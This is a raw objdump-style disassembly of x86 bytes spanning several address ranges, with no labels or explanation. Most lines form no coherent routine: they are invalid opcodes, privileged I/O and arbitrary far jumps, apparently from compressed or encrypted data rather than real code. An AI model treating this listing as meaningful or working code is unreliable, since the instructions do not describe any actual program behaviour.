  41f5f0:	mov    edi,0x1c76ea85
  41f5f5:	popf   
  41f5f6:	in     al,dx
  41f5f7:	push   ebx
  41f5f8:	cli    
  41f5f9:	out    0xc0,al
  41f5fb:	add    al,0xb8
  41f5fd:	(bad)  
  41f5fe:	pop    eax
  41f5ff:	scas   ax,WORD PTR es:[edi]
  41f601:	rcl    BYTE PTR [ebx+0x37],1
  41f604:	inc    esp
  41f605:	mov    al,0x21
  41f607:	stos   BYTE PTR es:[edi],al
  41f608:	dec    ebp
  41f609:	std    
  41f60a:	jl     0x41f5ef
  41f60c:	imul   edi,DWORD PTR [ebp+0x75],0x24
  41f610:	lods   al,BYTE PTR ds:[esi]
  41f611:	imul   esp,esp,0x16
  41f614:	and    DWORD PTR ds:0x9491fe73,ebx
  41f61a:	mov    edi,0x3200f59d
  41f61f:	xor    al,0xec
  41f621:	pop    ds
  41f622:	stos   DWORD PTR es:[edi],eax
  41f623:	lds    ebp,FWORD PTR [edx+edx*8]
  41f626:	lds    edx,FWORD PTR [ecx-0x36]
  41f629:	mul    DWORD PTR [ebx+0x790a7cf1]
  41f62f:	pop    edi
  41f630:	or     DWORD PTR [esi+0x74],ecx
  41f633:	xor    DWORD PTR [esi+ebp*8-0x23],esp
  41f637:	inc    ebx
  41f638:	stos   BYTE PTR es:[edi],al
  41f639:	push   ebx
  41f63a:	jmp    0x41f5ee
  41f63c:	jp     0x41f6ba
  41f63e:	xchg   esp,eax
  41f63f:	pop    edx
  41f640:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f641:	jns    0x41f61c
  41f643:	out    dx,al
  41f644:	inc    eax
  41f645:	fimul  WORD PTR [ebx+edx*1+0x37b7a3e2]
  41f64c:	cmp    eax,0x6c5880ee
  41f651:	xor    DWORD PTR [eax+eiz*2+0x17],esi
  41f655:	test   eax,0x30970ba3
  41f65a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f65b:	adc    BYTE PTR [ecx],al
  41f65d:	push   esp
  41f65e:	sub    al,0x3a
  41f660:	shl    al,0xc0
  41f663:	xchg   edi,eax
  41f664:	clc    
  41f665:	(bad)  
  41f666:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f667:	and    ch,BYTE PTR [ecx-0xa]
  41f66a:	mov    dl,0x3e
  41f66c:	mov    fs,edi
  41f66e:	imul   ebp,DWORD PTR [eax],0xfcc8a6d
  41f674:	(bad)  
  41f675:	cs jmp 0x41f652
  41f678:	lea    ecx,[edx]
  41f67a:	jbe    0x41f6ab
  41f67c:	add    esp,esi
  41f67e:	lds    eax,FWORD PTR [edi+0x7f777d33]
  41f684:	ins    DWORD PTR es:[edi],dx
  41f685:	pop    ebx
  41f686:	in     al,0xf0
  41f688:	and    al,0x9b
  41f68a:	fdivp  st(5),st
  41f68c:	sbb    eax,0xd77cc721
  41f691:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f692:	clc    
  41f693:	mov    WORD PTR [ecx],gs
  41f695:	lds    eax,FWORD PTR fs:0xcb918bf8
  41f69c:	popf   
  41f69d:	rcr    BYTE PTR [ecx],1
  41f69f:	sub    edx,edi
  41f6a1:	pop    esi
  41f6a2:	sar    DWORD PTR [esi],0x4b
  41f6a5:	ret    0xa1f4
  41f6a8:	push   ebp
  41f6a9:	pop    ebp
  41f6aa:	bound  edx,QWORD PTR es:0xdbeb6250
  41f6b1:	push   es
  41f6b2:	pop    ds
  41f6b3:	sbb    cl,BYTE PTR [ecx+0x0]
	...
  41f716:	xchg   edx,eax
  41f717:	cmp    al,0x23
  41f719:	jle    0x41f6ca
  41f71b:	jg     0x41f6fc
  41f71d:	cld    
  41f71e:	dec    ecx
  41f71f:	loope  0x41f6f2
  41f721:	sbb    DWORD PTR [ebx+0x4af88f69],edx
  41f727:	dec    ebp
  41f728:	add    DWORD PTR [eax],eax
  41f72a:	pop    es
  41f72b:	add    DWORD PTR [eax],eax
  41f72d:	add    ch,bh
  41f72f:	les    edx,FWORD PTR ds:0xedf3ee51
  41f735:	call   0xd3620c9b
  41f73a:	les    eax,FWORD PTR [edx+0x3102cd2c]
  41f740:	and    DWORD PTR [ebx+ebp*2],esi
  41f743:	cs js  0x41f718
  41f746:	cmp    eax,0x41bb054e
  41f74b:	loope  0x41f748
  41f74d:	nop
  41f74e:	and    BYTE PTR [edi],dl
  41f750:	pop    eax
  41f751:	popa   
  41f752:	inc    esp
  41f753:	xchg   BYTE PTR [edx],al
  41f755:	and    BYTE PTR [esp+eax*8-0x264ee61e],cl
  41f75c:	add    BYTE PTR [edi-0x15d3d032],ch
  41f762:	(bad)  
  41f763:	scas   al,BYTE PTR es:[edi]
  41f764:	jnp    0x41f7dc
  41f766:	mov    ebx,0x24a47fc2
  41f76b:	jmp    DWORD PTR [ecx]
  41f76d:	jbe    0x41f72e
  41f76f:	dec    ebx
  41f770:	ins    DWORD PTR es:[edi],dx
  41f771:	jp     0x41f70e
  41f773:	mov    ebp,0x4d64f5d7
  41f778:	rol    BYTE PTR [ebx],cl
  41f77a:	push   0x1ed516a5
  41f77f:	pop    edx
  41f780:	stc    
  41f781:	sahf   
  41f782:	sub    ecx,DWORD PTR [edx]
  41f784:	mov    ecx,?
  41f786:	jne    0x41f7b6
  41f788:	adc    eax,0x6ca51da8
  41f78d:	arpl   WORD PTR [ecx+0x18],sp
  41f790:	cwde   
  41f791:	xchg   BYTE PTR [ebx+0x1],cl
  41f794:	aam    0x7a
  41f796:	xor    DWORD PTR [edx],eax
  41f798:	ror    BYTE PTR [edi],cl
  41f79a:	xchg   ebx,esp
  41f79c:	stc    
  41f79d:	push   0xffffffb0
  41f79f:	pop    edi
  41f7a0:	pop    ebp
  41f7a1:	cmc    
  41f7a2:	in     al,dx
  41f7a3:	inc    ebx
  41f7a4:	out    dx,eax
  41f7a5:	xchg   edi,eax
  41f7a6:	shl    BYTE PTR [edx+0x5c],1
  41f7a9:	add    DWORD PTR fs:[ecx+0x3010dcef],esp
  41f7b0:	inc    edi
  41f7b1:	mov    dl,0xf8
  41f7b3:	sub    al,0x7f
  41f7b5:	test   al,0xca
  41f7b7:	into   
  41f7b8:	add    eax,0xba30ee90
  41f7bd:	adc    BYTE PTR [edx-0x2e52918e],dh
  41f7c3:	mov    eax,0x93696abb
  41f7c8:	mov    ecx,0x3c421d55
  41f7cd:	sbb    BYTE PTR [ebp+eax*8+0x17],ah
  41f7d1:	push   esi
  41f7d2:	or     BYTE PTR [ebp+0x1274f6da],0x7d
  41f7d9:	outs   dx,DWORD PTR ds:[esi]
  41f7da:	(bad)  
  41f7db:	lods   eax,DWORD PTR ds:[esi]
  41f7dc:	or     BYTE PTR ds:0xe8527861,ah
  41f7e2:	cld    
  41f7e3:	pop    ebx
  41f7e4:	into   
  41f7e5:	ins    BYTE PTR es:[edi],dx
  41f7e6:	aad    0x2a
  41f7e8:	lods   al,BYTE PTR ds:[esi]
  41f7e9:	adc    ebp,esp
  41f7eb:	(bad)  [edi]
  41f7ed:	jo     0x41f806
  41f7ef:	out    0xcc,al
  41f7f1:	mov    eax,ds:0x3b160608
  41f7f6:	retf   0xf2bf
  41f7f9:	(bad)  
  41f7fa:	iret   
  41f7fb:	mov    ebx,0xb9144a78
  41f800:	sbb    edx,0x55
  41f803:	rcr    BYTE PTR [edi-0x47],1
  41f806:	inc    BYTE PTR [ecx*1-0x2e699e47]
  41f80d:	and    DWORD PTR [edx],esp
  41f80f:	mov    dh,0x96
  41f811:	imul   ecx,DWORD PTR [esi-0x1],0x6cf8eed0
  41f818:	fldlg2 
  41f81a:	mov    ecx,?
  41f81c:	push   es
  41f81d:	or     eax,DWORD PTR [eax-0x44eeb7b2]
  41f823:	repz rol cl,cl
  41f826:	jbe    0x41f8a5
  41f828:	dec    ebp
  41f829:	sub    DWORD PTR [eax+0x3f43511b],0x7c385995
  41f833:	pusha  
  41f834:	lods   al,BYTE PTR ds:[esi]
	...
  41f895:	add    BYTE PTR [ecx+0x3b920b9a],ah
  41f89b:	xchg   ebx,eax
  41f89c:	mov    ecx,0x25be46bb
  41f8a1:	mov    ebx,DWORD PTR [ecx+edx*4]
  41f8a4:	cmp    eax,0x14e5130
  41f8a9:	add    BYTE PTR [edi],al
  41f8ab:	add    DWORD PTR [eax],eax
  41f8ad:	add    BYTE PTR [ebx+0x6ecb84c4],ah
  41f8b3:	push   ebp
  41f8b4:	loop   0x41f87c
  41f8b6:	sub    eax,0x43d69bd7
  41f8bb:	jg     0x41f8b6
  41f8bd:	jmp    0x41f892
  41f8bf:	in     al,0x0
  41f8c1:	xchg   esp,eax
  41f8c2:	sbb    eax,0x9739c72f
  41f8c7:	jb     0x41f85f
  41f8c9:	into   
  41f8ca:	jmp    0x9632:0x84c48f4a
  41f8d1:	rcl    al,0x70
  41f8d4:	add    eax,0x48c2421e
  41f8d9:	fiadd  DWORD PTR ds:0x93256db
  41f8df:	and    BYTE PTR [edx+edi*8-0x55ed4d81],dl
  41f8e6:	loop   0x41f8b8
  41f8e8:	jp     0x41f89d
  41f8ea:	repz hlt 
  41f8ec:	sub    dl,BYTE PTR [ebx-0x77]
  41f8ef:	pop    es
  41f8f0:	ds std 
  41f8f2:	pusha  
  41f8f3:	repnz mov cs,WORD PTR [edi+0xab676a8]
  41f8fa:	popa   
  41f8fb:	addr16 aaa 
  41f8fd:	stc    
  41f8fe:	fisttp QWORD PTR [edi-0x4c496b79]
  41f904:	addr16 mov edx,0x2daaa17e
  41f90a:	dec    esp
  41f90b:	add    al,0x19
  41f90d:	aad    0x1b
  41f90f:	xchg   ebx,eax
  41f910:	push   eax
  41f911:	mov    al,0xd5
  41f913:	int    0x57
  41f915:	ret    
  41f916:	scas   eax,DWORD PTR es:[edi]
  41f917:	xchg   ebp,eax
  41f918:	sub    edx,DWORD PTR [ecx+0x2337d443]
  41f91e:	xchg   esp,eax
  41f91f:	add    al,0xda
  41f921:	(bad)  
  41f923:	loop   0x41f95c
  41f925:	mov    ch,al
  41f927:	(bad)  
  41f928:	mov    dl,0x23
  41f92a:	mov    ch,0x77
  41f92c:	pop    ebx
  41f92d:	lock jecxz 0x41f91a
  41f930:	jp     0x41f91b
  41f932:	and    ah,ah
  41f934:	shl    ebx,1
  41f936:	adc    ecx,DWORD PTR [ecx+ebp*8]
  41f939:	popf   
  41f93a:	scas   al,BYTE PTR es:[edi]
  41f93b:	gs test al,0x5a
  41f93e:	mov    bl,0x6f
  41f940:	push   esp
  41f941:	adc    al,0xa
  41f943:	xchg   BYTE PTR [ebp+0x6d],bl
  41f946:	fstp   DWORD PTR [eax+0x5c4e894e]
  41f94c:	ror    DWORD PTR [ebp+0x25864e57],0x53
  41f953:	dec    ebp
  41f954:	jmp    0x6645:0xd2029037
  41f95b:	adc    al,0x2b
  41f95d:	add    dl,ch
  41f95f:	mov    ecx,0xd6ff247a
  41f964:	or     ebp,DWORD PTR [ecx+0x2201652b]
  41f96a:	cmp    eax,0x88acbb22
  41f96f:	mov    ds:0x19bbc13d,al
  41f974:	rcr    dh,cl
  41f976:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f977:	sbb    eax,0x128025a7
  41f97c:	add    dl,BYTE PTR [ebx]
  41f97e:	jne    0x41f955
  41f980:	mov    ecx,0xa5e41a7a
  41f985:	aad    0xd4
  41f987:	pop    es
  41f988:	pop    esi
  41f989:	(bad)  [esi+0x5d949bf3]
  41f98f:	dec    dl
  41f991:	in     eax,0xdd
  41f993:	inc    edx
  41f994:	(bad)  
  41f995:	in     eax,dx
  41f996:	mov    dl,0xd5
  41f998:	outs   dx,BYTE PTR ds:[esi]
  41f999:	adc    BYTE PTR [eax+0x363a0e55],0xe2
  41f9a0:	idiv   DWORD PTR [ebp-0x80]
  41f9a3:	push   ss
  41f9a4:	pop    edx
  41f9a5:	sar    bl,1
  41f9a7:	(bad)  
  41f9a8:	sbb    al,0x85
  41f9aa:	sbb    eax,0x65241848
  41f9af:	and    esi,ecx
  41f9b1:	clc    
  41f9b2:	out    0x31,al
  41f9b4:	xor    al,0x0
	...
  41fa16:	or     al,BYTE PTR [ecx-0x49]
  41fa19:	mov    eax,ds:0xeb1ef7ff
  41fa1e:	fwait
  41fa1f:	mov    eax,0xb9a28e70
  41fa24:	jbe    0x41f9c7
  41fa26:	pop    eax
  41fa27:	dec    edi
  41fa28:	add    DWORD PTR [eax],eax
  41fa2a:	pop    es
  41fa2b:	add    DWORD PTR [eax],eax
  41fa2d:	add    dl,al
  41fa2f:	(bad)  
  41fa30:	fdivr  QWORD PTR [edx]
  41fa32:	mov    al,ds:0x28362859
  41fa37:	pop    esp
  41fa38:	jnp    0x41fa9b
  41fa3a:	sbb    edx,DWORD PTR [edi+0x3439919b]
  41fa40:	and    BYTE PTR [edx-0x69],cl
  41fa43:	ins    BYTE PTR es:[edi],dx
  41fa44:	push   eax
  41fa45:	std    
  41fa46:	ins    DWORD PTR es:[edi],dx
  41fa47:	gs dec ebx
  41fa49:	push   es
  41fa4a:	xor    DWORD PTR [ebx-0x64],ebp
  41fa4d:	test   ah,0x2
  41fa50:	mov    ds:0x40db54af,al
  41fa55:	push   0x34c791fe
  41fa5a:	sub    BYTE PTR [edi+0x6c1e46a7],ah
  41fa60:	cmp    BYTE PTR [edi+ebx*4-0x44296e7],bl
  41fa67:	sub    edx,DWORD PTR [ecx+0x25]
  41fa6a:	xor    al,0x57
  41fa6c:	pop    ecx
  41fa6d:	jg     0x41fab4
  41fa6f:	ins    BYTE PTR es:[edi],dx
  41fa70:	rcl    DWORD PTR [ecx+0x3ad255a0],cl
  41fa76:	call   0xa10f255
  41fa7b:	scas   al,BYTE PTR es:[edi]
  41fa7c:	add    al,0x8
  41fa7e:	mov    eax,0x338b4cc2
  41fa83:	sbb    al,0xb6
  41fa85:	mov    eax,0x3f8f3b17
  41fa8a:	and    al,0x70
  41fa8c:	pop    ds
  41fa8d:	fwait
  41fa8e:	clc    
  41fa8f:	jb     0x41faeb
  41fa91:	xchg   bl,dl
  41fa93:	jp     0x41fa86
  41fa95:	sbb    BYTE PTR [ebp-0x53],bl
  41fa98:	xchg   esp,edi
  41fa9a:	adc    esi,DWORD PTR [edi-0x6b]
  41fa9d:	dec    ebx
  41fa9e:	or     bl,al
  41faa0:	and    BYTE PTR [eax-0x7f066cde],bl
  41faa6:	push   ebp
  41faa7:	fwait
  41faa8:	sbb    BYTE PTR [esi],bl
  41faaa:	ins    DWORD PTR es:[edi],dx
  41faab:	fdiv   st,st(0)
  41faad:	out    dx,eax
  41faae:	dec    DWORD PTR [edx-0x53746d04]
  41fab4:	mov    ebp,0x647172f
  41fab9:	(bad)  
  41faba:	jae    0x41fad8
  41fabc:	fidivr DWORD PTR [eax+ebp*8+0x1aae35fc]
  41fac3:	and    al,0xe8
  41fac5:	xchg   ecx,eax
  41fac6:	daa    
  41fac7:	sbb    BYTE PTR es:[edx-0x7e3df073],al
  41face:	aas    
  41facf:	mov    ds:0xca9fc86,eax
  41fad4:	dec    ecx
  41fad5:	outs   dx,BYTE PTR ds:[esi]
  41fad6:	(bad)  
  41fad7:	jno    0x41faea
  41fad9:	stc    
  41fada:	sub    ebp,DWORD PTR [di+0x65ce]
  41fadf:	xor    ecx,eax
  41fae1:	adc    dh,BYTE PTR [ebp+0x34bdcf92]
  41fae7:	in     al,0x42
  41fae9:	test   eax,0x102fef69
  41faef:	push   ss
  41faf0:	out    0x81,eax
  41faf2:	gs aam 0xf7
  41faf5:	jae    0x41fa82
  41faf7:	(bad)  
  41faf8:	shl    bh,cl
  41fafa:	add    BYTE PTR [esi+ecx*8+0x24e9f7a1],ah
  41fb01:	adc    al,ch
  41fb03:	dec    edx
  41fb04:	and    edx,DWORD PTR [ebp+0x39]
  41fb07:	std    
  41fb08:	idiv   BYTE PTR [edx]
  41fb0a:	pop    edi
  41fb0b:	push   esp
  41fb0c:	push   esp
  41fb0d:	mov    ecx,0x7d01c5d4
  41fb12:	sub    edx,eax
  41fb14:	lods   eax,DWORD PTR ds:[esi]
  41fb15:	(bad)  
  41fb16:	pop    ds
  41fb17:	xor    eax,0x66bc420a
  41fb1c:	outs   dx,DWORD PTR ds:[esi]
  41fb1d:	pop    ds
  41fb1e:	xor    al,BYTE PTR [ebx+0x684bf605]
  41fb24:	in     al,dx
  41fb25:	sbb    ch,dh
  41fb27:	dec    ecx
  41fb28:	and    eax,0x2eaa83ce
  41fb2d:	sbb    BYTE PTR [ecx+0x7f],dh
  41fb30:	loop   0x41fb25
  41fb32:	fwait
  41fb33:	in     al,0xac
	...
  41fb95:	add    ah,bl
  41fb97:	sub    BYTE PTR [edx-0x119011c],cl
  41fb9d:	cmp    cl,ah
  41fb9f:	cmc    
  41fba0:	push   cs
  41fba1:	adc    al,0x2e
  41fba3:	loopne 0x41fb63
  41fba5:	rcr    DWORD PTR [edi+0x50],cl
  41fba8:	add    DWORD PTR [eax],eax
  41fbaa:	pop    es
  41fbab:	add    DWORD PTR [eax],eax
  41fbad:	add    BYTE PTR [ebx],ch
  41fbaf:	adc    esp,esp
  41fbb1:	adc    BYTE PTR [edi],dl
  41fbb3:	enter  0x290b,0xcf
  41fbb7:	add    ecx,DWORD PTR [ecx+0x50]
  41fbba:	push   edx
  41fbbb:	stos   BYTE PTR es:[edi],al
  41fbbc:	mov    eax,ds:0x557eb7b2
  41fbc1:	mov    ebx,0x97747ffe
  41fbc6:	ja     0x41fbc8
  41fbc8:	mov    ebx,0x118b6c4f
  41fbcd:	in     eax,dx
  41fbce:	cs popf 
  41fbd0:	scas   al,BYTE PTR es:[edi]
  41fbd1:	pop    ebx
  41fbd2:	or     ebp,esi
  41fbd4:	arpl   WORD PTR [edi-0x6c],cx
  41fbd7:	int    0xc0
  41fbd9:	add    cl,BYTE PTR [edi-0x79]
  41fbdc:	jle    0x41fbff
  41fbde:	out    0x5e,al
  41fbe0:	rol    DWORD PTR [edi+0x9d1d2c0],0x3d
  41fbe7:	sbb    eax,0xc5ad20ce
  41fbec:	lock iret 
  41fbee:	or     BYTE PTR [ebx],dl
  41fbf0:	pop    ss
  41fbf1:	or     ah,ch
  41fbf3:	fist   WORD PTR [edx-0x7f]
  41fbf6:	push   ebp
  41fbf7:	pop    edx
  41fbf8:	push   ds
  41fbf9:	mov    ebx,0xf8b12904
  41fbfe:	leave  
  41fbff:	(bad)  
  41fc00:	jb     0x41fc50
  41fc02:	xchg   ebx,eax
  41fc03:	in     al,dx
  41fc04:	lods   eax,DWORD PTR ds:[esi]
  41fc05:	sbb    eax,DWORD PTR [ebx+edi*8-0x464dc6f7]
  41fc0c:	xor    al,0xf0
  41fc0e:	sbb    al,0xd5
  41fc10:	mov    esi,0x9e0dd46e
  41fc15:	call   0x8f384ea0
  41fc1a:	neg    DWORD PTR [ebx+0x7dbdc02c]
  41fc20:	add    DWORD PTR [ebp-0x4b],ecx
  41fc23:	mov    ebp,0xdaa40343
  41fc28:	and    eax,0x2b04f421
  41fc2d:	sub    al,0x94
  41fc2f:	pop    edx
  41fc30:	and    al,0xe7
  41fc32:	pop    edx
  41fc33:	fwait
  41fc34:	retf   0x73b5
  41fc37:	sbb    BYTE PTR [esi+0x66],ch
  41fc3a:	cdq    
  41fc3b:	inc    edx
  41fc3c:	pop    ebp
  41fc3d:	(bad)  
  41fc3e:	fs out 0x6,eax
  41fc41:	mov    dl,0xac
  41fc43:	adc    esp,ecx
  41fc45:	mov    esi,0xe0646b8a
  41fc4a:	hlt    
  41fc4b:	icebp  
  41fc4c:	stc    
  41fc4d:	inc    esp
  41fc4e:	pop    edi
  41fc4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc50:	loopne 0x41fc54
  41fc52:	rcl    eax,cl
  41fc54:	sti    
  41fc55:	es test bl,al
  41fc58:	arpl   dx,sp
  41fc5a:	std    
  41fc5b:	mov    ss,WORD PTR [edi+0x78]
  41fc5e:	sbb    BYTE PTR [ecx-0x3d],bl
  41fc61:	or     eax,0x2833a9d1
  41fc66:	add    al,BYTE PTR [edi-0x3dd846da]
  41fc6c:	mov    dl,0x91
  41fc6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc6f:	cmc    
  41fc70:	(bad)  
  41fc71:	stc    
  41fc72:	call   0x9182d974
  41fc77:	mov    esi,0xc1024de6
  41fc7c:	pop    edi
  41fc7d:	rcr    BYTE PTR [ebx],cl
  41fc7f:	int3   
  41fc80:	stos   BYTE PTR es:[edi],al
  41fc81:	(bad)  
  41fc82:	mov    edx,0x7ac73fe
  41fc87:	loop   0x41fca0
  41fc89:	mov    ds:0xa0951620,eax
  41fc8e:	ins    BYTE PTR es:[edi],dx
  41fc8f:	inc    edi
  41fc90:	in     al,0xa
  41fc92:	xchg   BYTE PTR [esi-0x7c0ef570],bl
  41fc98:	or     edx,DWORD PTR [edi-0x49560b53]
  41fc9e:	aas    
  41fc9f:	loop   0x41fc7b
  41fca1:	xor    DWORD PTR [ebx-0x3a5420c7],esi
  41fca7:	(bad)  
  41fca8:	pop    eax
  41fca9:	jp     0x41fd10
  41fcab:	inc    ebx
  41fcac:	push   edi
  41fcad:	add    al,0x30
  41fcaf:	(bad)  
  41fcb0:	call   0x0:0x792a663e
	...
  41fd13:	add    BYTE PTR [eax],al
  41fd15:	add    BYTE PTR [edx+ebp*2],cl
  41fd18:	push   edx
  41fd19:	shl    DWORD PTR [esi-0x7],0x9f
  41fd1d:	out    dx,eax
  41fd1e:	je     0x41fd3b
  41fd20:	pop    ebp
  41fd21:	inc    edi
  41fd22:	aaa    
  41fd23:	fcom   QWORD PTR ds:0x1516657
  41fd29:	add    BYTE PTR [edi],al
  41fd2b:	add    DWORD PTR [eax],eax
  41fd2d:	add    BYTE PTR [ecx],bl
  41fd2f:	mov    ebx,DWORD PTR [esi]
  41fd31:	inc    ebx
  41fd32:	shl    BYTE PTR [edx-0x27],0xe6
  41fd36:	pop    ds
  41fd37:	pushf  
  41fd38:	inc    edx
  41fd39:	cld    
  41fd3a:	cmp    edi,0x41278842
  41fd40:	mov    ch,0x1b
  41fd42:	(bad)  
  41fd43:	repz (bad) 
  41fd45:	sbb    al,0x4c
  41fd47:	retf   
  41fd48:	daa    
  41fd49:	out    dx,eax
  41fd4a:	or     BYTE PTR gs:[eax],bh
  41fd4d:	and    DWORD PTR [edi],0x38
  41fd50:	mov    ebp,0x747b807e
  41fd55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd56:	leave  
  41fd57:	cdq    
  41fd58:	mov    gs,WORD PTR [ebp+0x3564d2eb]
  41fd5e:	jl     0x41fd78
  41fd60:	jecxz  0x41fde1
  41fd62:	pusha  
  41fd63:	les    esp,FWORD PTR [edx-0x31cec7b]
  41fd69:	jg     0x41fdb4
  41fd6b:	add    DWORD PTR [ebp+0x0],esp
  41fd6e:	jmp    0x41fda8
  41fd70:	bound  eax,QWORD PTR [edi+0x57e0b7bf]
  41fd76:	aas    
  41fd77:	mov    ebp,DWORD PTR [ebp+0x54632ee7]
  41fd7d:	aam    0xa3
  41fd7f:	ret    
  41fd80:	pop    eax
  41fd81:	pop    esi
  41fd82:	adc    eax,0xf76cf436
  41fd87:	pop    ds
  41fd88:	nop
  41fd89:	and    al,0xd1
  41fd8b:	ss xchg esi,eax
  41fd8d:	sbb    DWORD PTR ds:0xe1d0b9ee,ecx
  41fd93:	cmp    al,0x82
  41fd95:	or     esp,DWORD PTR [ecx+edx*4-0x14]
  41fd99:	jecxz  0x41fddb
  41fd9b:	(bad)  
  41fd9c:	jne    0x41fe01
  41fd9e:	jmp    0xe43e15d0
  41fda3:	std    
  41fda4:	xchg   esp,eax
  41fda5:	ror    cl,1
  41fda7:	test   al,0x73
  41fda9:	inc    eax
  41fdaa:	or     DWORD PTR [eax+0x5c],eax
  41fdad:	adc    BYTE PTR [esi+edi*4],al
  41fdb0:	(bad)  
  41fdb2:	mov    al,0x9
  41fdb4:	xchg   esp,eax
  41fdb5:	outs   dx,BYTE PTR ds:[esi]
  41fdb6:	adc    BYTE PTR gs:[ebx+ecx*4-0x2e],bh
  41fdbb:	jmp    0x35d925d8
  41fdc0:	js     0x41fe23
  41fdc2:	repnz mov edx,0x85e27c6d
  41fdc8:	pusha  
  41fdc9:	dec    ebp
  41fdca:	inc    edi
  41fdcb:	push   0xffffff97
  41fdcd:	dec    eax
  41fdce:	mov    cl,0xed
  41fdd0:	ret    0x4bd7
  41fdd3:	sti    
  41fdd4:	lods   al,BYTE PTR ds:[esi]
  41fdd5:	bnd jns 0x41fdc1
  41fdd8:	add    ecx,DWORD PTR [ecx+eax*2-0x53]
  41fddc:	add    edx,DWORD PTR [eax]
  41fdde:	jmp    DWORD PTR [ebx]
  41fde0:	xchg   esp,eax
  41fde1:	sub    eax,0xebec2f8c
  41fde6:	dec    esp
  41fde7:	cli    
  41fde8:	aam    0xa0
  41fdea:	aam    0xc9
  41fdec:	lahf   
  41fded:	sbb    BYTE PTR [eax-0x24230f0f],cl
  41fdf3:	jecxz  0x41fe66
  41fdf5:	inc    esp
  41fdf6:	aam    0x79
  41fdf8:	cli    
  41fdf9:	push   ecx
  41fdfa:	mov    eax,ds:0xa2181484
  41fdff:	jmp    0xd052:0x36ff3985
  41fe06:	mov    WORD PTR [edx+0x37d8efb5],?
  41fe0c:	test   al,0x2c
  41fe0e:	repnz xor BYTE PTR [ebx],0x77
  41fe12:	mov    esi,gs
  41fe14:	call   DWORD PTR [edx]
  41fe16:	inc    esi
  41fe17:	stos   BYTE PTR es:[edi],al
  41fe18:	jmp    0xa3da:0x2156dca5
  41fe1f:	push   ebx
  41fe20:	repnz pusha 
  41fe22:	retf   
  41fe23:	pop    esp
  41fe24:	inc    edx
  41fe25:	je     0x41fe3f
  41fe27:	sti    
  41fe28:	cdq    
  41fe29:	and    BYTE PTR [esi-0x2cf464e6],0xdc
  41fe30:	adc    DWORD PTR ds:0xcbe81a,ebp
	...
  41fe96:	stos   BYTE PTR es:[edi],al
  41fe97:	push   ebp
  41fe98:	call   0x515d:0xffefffe7
  41fe9f:	lock xor DWORD PTR [edi+0x49],0x7
  41fea4:	jmp    0x41fe5b
  41fea6:	ins    DWORD PTR es:[edi],dx
  41fea7:	push   edx
  41fea8:	add    DWORD PTR [eax],eax
  41feaa:	pop    es
  41feab:	add    DWORD PTR [eax],eax
  41fead:	add    BYTE PTR [eax-0x68],cl
  41feb0:	cwde   
  41feb1:	and    DWORD PTR gs:[ecx+0x27bbf675],esi
  41feb8:	pop    es
  41feb9:	out    dx,al
  41feba:	test   eax,0xbde3198d
  41febf:	adc    eax,0x62f9178b
  41fec4:	mov    ebx,0xca0c11b1
  41fec9:	enter  0x4e3a,0x2e
  41fecd:	pop    esi
  41fece:	add    BYTE PTR [edx+0x66],dh
  41fed1:	cwde   
  41fed2:	jle    0x41fea3
  41fed4:	cmc    
  41fed5:	lods   eax,DWORD PTR ds:[esi]
  41fed6:	mov    ebp,0xa51c5482
  41fedb:	loope  0x41feba
  41fedd:	imul   DWORD PTR [ecx]
  41fedf:	adc    BYTE PTR [ebx-0x7cb49e31],ch
  41fee5:	pop    ebx
  41fee6:	mov    edi,0x108f0ab
  41feeb:	inc    ebp
  41feec:	dec    esp
  41feed:	fdiv   st,st(6)
  41feef:	(bad)  
  41fef0:	dec    edx
  41fef1:	sbb    BYTE PTR [edx-0xb13f69a],dh
  41fef7:	cmp    dh,dh
  41fef9:	pop    ecx
  41fefa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fefb:	mov    ebx,0x521a81ca
  41ff00:	push   ds
  41ff01:	shl    BYTE PTR [edx-0x3c],0x92
  41ff05:	lods   al,BYTE PTR ds:[esi]
  41ff06:	cmp    edx,ebp
  41ff08:	out    0x79,eax
  41ff0a:	adc    DWORD PTR [ebp+0x76],ecx
  41ff0d:	cwde   
  41ff0e:	inc    ebx
  41ff0f:	dec    ebx
  41ff10:	leave  
  41ff11:	xchg   DWORD PTR [ebx+0xffbc73e],ebp
  41ff17:	xor    DWORD PTR [eax-0xba0eac3],edi
  41ff1d:	jl     0x41ff22
  41ff1f:	fst    QWORD PTR [ecx+0x4]
  41ff22:	xor    DWORD PTR [ebx+0x3e8a0337],ecx
  41ff28:	inc    ebp
  41ff29:	and    eax,0x2d302a35
  41ff2e:	ficomp WORD PTR [esi+0x23]
  41ff31:	imul   ebx,ebx,0x78
  41ff34:	outs   dx,DWORD PTR ds:[esi]
  41ff35:	xchg   DWORD PTR [ebp+0x2f],esi
  41ff38:	ffree  st(1)
  41ff3a:	out    dx,eax
  41ff3b:	adc    al,BYTE PTR [ebp-0x74]
  41ff3e:	pop    ebp
  41ff3f:	jae    0x41fefb
  41ff41:	add    DWORD PTR [ecx+eax*2],eax
  41ff44:	(bad)  
  41ff45:	push   esi
  41ff46:	inc    eax
  41ff47:	adc    esi,esp
  41ff49:	test   DWORD PTR [ebp-0x38daa1d4],ebp
  41ff4f:	pop    ecx
  41ff50:	mov    es,WORD PTR [ecx+ebp*1+0x214ff464]
  41ff57:	jne    0x41ff77
  41ff59:	sbb    eax,0x9a9d605d
  41ff5e:	into   
  41ff5f:	(bad)  
  41ff61:	loopne 0x41ff72
  41ff63:	push   0x10
  41ff65:	jne    0x41ff45
  41ff67:	dec    ebp
  41ff68:	mov    al,ds:0x25785307
  41ff6d:	mov    ebx,0xfda9ac43
  41ff72:	test   BYTE PTR [esi+esi*4],cl
  41ff75:	sbb    ebx,edx
  41ff77:	jne    0x41ff33
  41ff79:	xlat   BYTE PTR ds:[ebx]
  41ff7a:	jg     0x41ffd1
  41ff7c:	or     al,0x81
  41ff7e:	enter  0xfbdf,0xa2
  41ff82:	inc    edx
  41ff83:	push   es
  41ff84:	shl    eax,1
  41ff86:	outs   dx,BYTE PTR ds:[esi]
